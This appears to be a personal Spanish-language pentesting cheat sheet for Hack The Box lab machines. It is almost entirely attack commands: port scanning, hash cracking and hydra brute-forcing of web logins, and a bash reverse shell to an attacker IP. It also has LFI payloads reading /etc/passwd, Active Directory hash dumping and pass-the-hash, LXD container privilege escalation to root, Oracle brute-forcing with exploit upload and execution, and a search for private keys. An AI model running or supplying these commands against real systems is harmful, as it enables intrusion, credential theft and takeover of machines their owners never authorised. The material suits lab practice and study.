****************************************************************Escaneo de puertos**

ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.46 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.10.10.46
Masscan -p 1-65535 10.10.10.30 -e tun0 –rate=1000
nmap -sU -v 10.10.10.55
nmap -sV -sC -p- -Pn 10.10.10.49 --min-rate=10000

***************************************************************Cracking password**

1. Extract hash zip
  zip2john filezip
2. Crack the hash
  john --pot=test.pot --wordlist=/usr/share/john/password.lst hash
  john hash -wordlist=/usr/share/wordlists/rockyou.txt
  
  Para saber que tipo de hash, nota: en el archivo hash.txt va el hash a crackear.
  john --wordlist=/usr/share/john/password.lst --rules= hash.txt
  
  una vez identificado se lanza el siguiente comando
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash.txt
  
  hydra -l admin -P rockyou.txt 10.10.10.75 http-post-form "nibleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
  hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
  

************************************************************* comandos para después de obtener una shell**
Permiten que se pueda interactuar con la shell para poder usar las teclas subir bajar y digitar bien en editores de texto.

ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>

Comando para obtener una shell de linux cuando se tiene una conexión con nc.

SHELL=/bin/bash script -q /dev/null
ó
bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
ó
python3 -c "import pty; pty.spawn('/bin/bash')"
python3 -c 'import pty; pty.spawn("/bin/sh")'

************************************************************* Scan web*********************************

Scan subdirectory

gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt
dirb http://10.10.10.6
gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirb/big.txt
gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k

scan extensions files
gobuster -w /usr/share/wordlists/dirb/small.txt dir --url http://10.10.10.56/cgi-bin- s 200,204,301,302,307,401,403 -x sh,pl

Para saltar los avisos ssl
gobuster dir --url https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k

scan files & folders

  gobuster dir -u http://10.10.10.48 -w /usr/share/wordlists/dirb/big.txt

revisando LFI
http://10.10.10.55/?file=../../../../etc/passwd

Si se puede subir una reverse_shell.php se puede llamar con el siguiente LFI URL
http://10.10.10.55/?file=../../../../var/lib/tftpboot/rev.php 

************************************************************Arquitectura de sistesmas operativos***************************

Windows wmic OS get OSArchitecture
windows systeminfo | findstr /I type
Linux uname -r

************************************************************Servidor HTTP Temporal *************************************

python3 -m SimpleHTTPServer 80
python3 -m http.server 8000

************************************************************Firewall rules******************************************
iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT

***********************************************************directorio activo****************************************
pip install bloodhound
bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -n 10.10.10.30

Extracción de un hash del TGT Ticket
GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30 > hash

Conectarse al servidor por medio de WinRm
evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19

Dump Hashes DC
secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30

conectarse al servidor con hashe
psexec.py megacorp.local/administrator@10.10.10.30 -hashes <NTML hash>:<NTLM hash>

************************************************************Contenedores de linux LXC***********************************
Contienen un entorno de servicios, entre ellos contienen comandos para poder ejecutar en el sistema operativo:

En la máquina atacante descargar:
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

Esto genera un archivo con el nombre alpine-v3.11-x86_64-20200505_1834.tar.gz el cual debe ser sube al remote host

se crea un alias a la imagen
lxc image import ./alpine-v3.11-x86_64-20200505_1834.tar.gz --alias rootimage
lxc init rootimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

**********************************************************smb************************************************
smbclient -N -L \\10.10.10.27\\
smbclient -N \\10.10.10.27\backups

*********************************************************Tunnel ssh ****************************************
ssh -i root.key -L9000:10.10.10.75:80 10.10.10.73
L9000: Puerto local a publicar
10.10.10.75:80: IP y puerto remoto a consultar
10.10.10.73 Servidor mediante el cual se realizará la salida.

Al final en el navegador se consultará como http://localhost:9000
****************************************************Oracle***************************************************
https://github.com/quentinhardy/odat
Con el programa odat se puede realizar una enumeración del objetivo
python3 odat.py sidguesser -s 10.10.10.82 -p 1521 --> Para tratar de averiguar los SID
python3 odat.py passwordgesser -s 10.10.10.82 -p 1521 -d EXE --accounts-file accounts/oracle_default_password.txt --> Con este comando se realiza un ataque de fuerza bruta con el archivo oracle_default_password.txt, el cual es copiado del directorio de metasploit a la carpeta accounts del programa ODAT, es importante no dejar espacios en el archivo. con vi :%s/ /\//g 
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ oracle.exe ~/HackTheBox/silo/oracle.exe --> utlfile: se usa para subir archivos --sysdba: se usa para decirle que es administrador --putfile: a.) va la ruta donde quiere dejarse el archivo, preferiblemente en "C:\ exploit.exe" se debe dejar un espacio en la ruta del archivo. c). por último la ruta donde se encuentra localmente el exploit.
python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ oracle.exe --> externaltable p--exec para ejecución de algún archivo en el servidor.

Para conectarse a la dbs oracle, desde kali:
sudo -s
source /etc/profile
sqlplus scott/tiger@10.10.10.82:1521/XE

NOTA: La máquina de HTB Silo, describe muy bien el procedimiento
https://www.youtube.com/watch?v=2c7SzNo9uoA&feature=emb_title

*************************************Buscar archivos con private key********************
 find / -xdev -type f -print0 | xargs -0 grep -H "BEGIN RSA PRIVATE KEY"
 **********************************monitorear crontabs
 ./pspy64
 ***********************************iptables***************************
 iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j REJECT
netfilter-persistent save
netfilter-persistent reload





